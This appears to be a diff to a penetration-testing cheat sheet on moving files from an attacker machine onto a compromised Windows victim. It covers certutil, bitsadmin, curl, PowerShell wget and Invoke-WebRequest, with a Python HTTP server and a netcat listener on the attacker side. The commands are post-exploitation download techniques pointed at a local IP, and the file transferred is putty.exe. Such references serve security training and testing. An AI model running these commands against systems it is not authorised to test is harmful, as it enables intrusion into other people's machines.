@@ -3,12 +3,13 @@
 
 
 ### IWR (Invoke-Web Request)
-
-
+First exploit the Victim machine using netcat
+```
+nc -lvp 4444
+```
 Attacker: 
 ```
 python -m SimpleHTTPServer 80
-nc -lvp 4444
 ```
 Victim: 
 ```
@@ -24,11 +25,11 @@ dir
 
 ### Certutil
 
-
-Attacker Machine: We can use the same SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.
-
-Victim Machine: Make use of the following command to download the file from the attacker machine. For the command, you have mentioned the ip-address/file “and then the output file name. The -f in the command generally forces overwrite.
-
+Attacker: 
+```
+python -m SimpleHTTPServer 80
+```
+Victim:
 ```
 certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
 or
@@ -36,17 +37,22 @@ certutil -urlcache -split -f http://192.168.1.2/putty.exe putty.exe
 ```
 
 ### Bitsadmin
+Attacker: 
+```
+python -m SimpleHTTPServer 80
+```
+Victim:
 ```
 bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
 ```
 
 ### Curl
 
-Attacker Machine: We can use the same SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.
+Attacker: 
 ```
 python -m SimpleHTTPServer 80
 ```
-Victim Machine: On the victim machine, run the following command to download the file from the attacker machine.
+Victim:
 ```
 curl http://192.168.1.2/putty.exe -o putty.exe
 dir
@@ -54,11 +60,11 @@ dir
 
 Wget
 ----
-Attacker Machine: Run the SimpleHTTP Server on port 80 on the attacker machine to send the file from that directory.
+Attacker: 
 ```
 python -m SimpleHTTPServer 80
 ```
-Victim Machine: Open Powershell on the windows machine and run the following command. Mention the path to download the file from and then give the output path to save the file putty.exe.
+Victim: Open Powershell on the windows machine and run the following command. Mention the path to download the file from and then give the output path to save the file putty.exe.
 ```
 powershell 
 wget http://192.168.1.2/putty.exe -OutFile putty.exe
